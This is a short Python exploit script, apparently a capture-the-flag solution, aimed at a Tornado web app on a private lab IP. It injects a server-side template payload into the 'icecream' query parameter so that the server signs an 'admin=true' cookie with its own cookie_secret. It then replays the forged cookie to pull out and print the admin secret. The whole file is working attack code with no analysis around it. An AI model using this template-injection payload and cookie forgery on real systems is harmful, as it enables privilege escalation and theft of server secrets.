#!/usr/bin/env python3
import html
import re
import urllib.parse

import requests

BASE_URL = "http://10.0.118.48:30379/"


def extract_note_value(page: str) -> str:
    match = re.search(r"</form>\s*<p>(.*?)</p>", page, flags=re.DOTALL)
    if not match:
        raise RuntimeError("Could not extract output block from response")
    return html.unescape(match.group(1).strip())


def get_signed_admin_cookie(session: requests.Session) -> str:
    # SSTI payload asks server-side Tornado to sign admin=true for us.
    payload = (
        '{{__import__("tornado.web").web.create_signed_value('
        'application.settings.get("cookie_secret"),"admin","true")}}'
    )
    url = BASE_URL + "?icecream=" + urllib.parse.quote(payload, safe="")
    response = session.get(url, timeout=10)
    response.raise_for_status()
    token = extract_note_value(response.text)
    if not token.startswith("2|1:0|"):
        raise RuntimeError(f"Unexpected cookie token format: {token!r}")
    return token


def get_secret_with_cookie(session: requests.Session, admin_cookie: str) -> str:
    response = session.get(BASE_URL, cookies={"admin": admin_cookie}, timeout=10)
    response.raise_for_status()
    match = re.search(r"<b>(.*?)</b>", response.text, flags=re.DOTALL)
    if not match:
        raise RuntimeError("Could not find secret block in response")
    return html.unescape(match.group(1).strip())


def main() -> None:
    session = requests.Session()
    admin_cookie = get_signed_admin_cookie(session)
    secret = get_secret_with_cookie(session, admin_cookie)

    print("[+] forged admin cookie:", admin_cookie)
    print("[+] secret:", secret)


if __name__ == "__main__":
    main()
